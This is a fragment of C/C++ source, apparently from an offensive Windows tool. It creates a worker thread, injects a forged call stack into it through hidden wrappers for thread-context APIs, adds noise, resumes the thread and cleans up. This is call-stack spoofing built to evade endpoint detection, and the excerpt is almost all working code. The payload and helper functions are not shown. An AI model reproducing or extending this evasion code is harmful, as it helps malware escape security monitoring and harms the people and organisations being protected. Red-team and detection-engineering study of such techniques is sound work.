    if (!hWorkerThread) {
        printf("[-] Failed to create worker thread\n");
        HiddenNtFreeVirtualMemory(g_BaseMemory, 0, MEM_RELEASE);  // Fixed: use g_BaseMemory
        return -1;
    }
    
    printf("[*] Applying fake call stack to worker thread\n");
    CONTEXT workerContext = {};
    workerContext.ContextFlags = CONTEXT_FULL;
    
    auto processStack = CreateProcessOperationsStack();
    InitializeCallstack(processStack);
    
    if (HiddenGetThreadContext(hWorkerThread, &workerContext)) {
        auto callbackStack = CreateNetworkOperationsStack();
        if (InitializeCallstack(callbackStack) == STATUS_SUCCESS) {
            InitializeFakeThreadState(workerContext, callbackStack);
            HiddenSetThreadContext(hWorkerThread, &workerContext);
            printf("[+] Fake stack injected successfully\n");
        }
    }
    
    GenerateNoise();
    
    printf("[*] Resuming worker thread\n");
    HiddenResumeThread(hWorkerThread);
    
    printf("[*] Waiting for completion\n");
    WaitForSingleObject(hWorkerThread, INFINITE);
    
    printf("[*] Cleaning up resources\n");
    CloseHandle(hWorkerThread);
    HiddenNtFreeVirtualMemory(g_BaseMemory, 0, MEM_RELEASE);
    
    printf("[+] Execution completed successfully\n");
    return 0;
}